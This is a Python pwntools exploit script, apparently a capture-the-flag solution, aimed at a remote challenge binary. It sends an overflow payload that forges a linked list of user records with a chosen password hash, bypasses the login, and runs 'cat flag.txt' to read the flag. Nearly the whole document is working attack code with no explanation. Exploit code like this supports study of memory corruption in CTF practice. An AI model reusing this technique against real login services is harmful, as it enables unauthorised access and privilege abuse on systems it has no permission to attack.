#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./task --host 109.233.56.90 --port 11592
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./task')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11592)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvuntil(b'login: ')

pl = b'flagholder\x00'.ljust(16, b'\x00')
pl += b'$6$LJ8k.XRF$6aBGNXSDwUGyJ2irxu0lZJBEuu1hwIQEF3JGG3sNbP20dxCBV0fJgnULFqJbJErn.7fBBCk5.s56Pub/8/Ww/1\x00'.ljust(128, b'\x00')

hash_adr = 0x404100 + 16
username_adr = 0x404100
FIRST_USER = 0x404100 + 16 + 128

N = 21

for i in range(N):

	pl += p64(username_adr)		#username_address
	pl += p64(51337)			#uid
	pl += p64(hash_adr)			#hash_address
	if i == N - 1:				#last_UserInfo_address
		pl += p64(0)
	else:
		pl += p64(FIRST_USER + (i+1)*48)
	pl += 16*b'\x00'			#trash

pl = pl.ljust(4096, b'\x00')
pl += p64(FIRST_USER)

io.sendline(pl)
io.recv()
io.sendline(b'guest')
io.recv()
io.sendline(b'cat flag.txt')


io.interactive()

